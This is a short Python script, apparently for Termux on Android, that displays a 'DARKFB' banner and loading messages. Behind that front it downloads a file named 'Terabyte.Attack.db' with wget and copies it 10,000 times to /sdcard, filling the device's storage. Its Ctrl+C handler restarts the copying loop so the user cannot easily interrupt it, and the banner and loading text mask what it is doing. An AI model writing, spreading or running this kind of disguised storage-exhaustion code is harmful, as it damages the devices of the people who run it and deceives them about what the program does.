# -*- coding: utf-8 -*-
# coding=utf-8
import time,os,sys
                     
def sprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1.2 / 100)
        
logo = """\x1b[91m
 
██████╗  █████╗ ██████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██║  ██║███████║██████╔╝█████╔╝ █████╗  ██████╔╝
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██║██║  ██╗██║     ██████╔╝
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═════╝ 
   \x1b[33m\033[41m ᴛᴏᴏʟs ʙʏ YASU \033[00m\x1b[91m       (____/\x1b[00m"""
def main():
	try:
		for i in range(10000):
			os.system("cp Terabyte.Attack.db /sdcard"+str(i))
	except KeyboardInterrupt:
		main()

def space():
	s =(' ')
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	print(s)
	
def run():
	try:
		os.system('wget https://raw.githubusercontent.com/saydog/Terabyte-attack/master/Terabyte.Attack.db')
		os.system('clear')
		space()
		main()
		sprint(logo)
		print('')
		sprint('    \x1b[33mLoading please wait !')
		sprint('    \x1b[33mᴇɴᴊᴏʏ ᴛʜᴇ ᴍᴏᴍᴇɴᴛ, \x1b[91mᴅᴜᴅᴇ 🤏')
		print('')
		sprint('    ...')
		time.sleep(50)
	except KeyboardInterrupt:
		main()
		
run()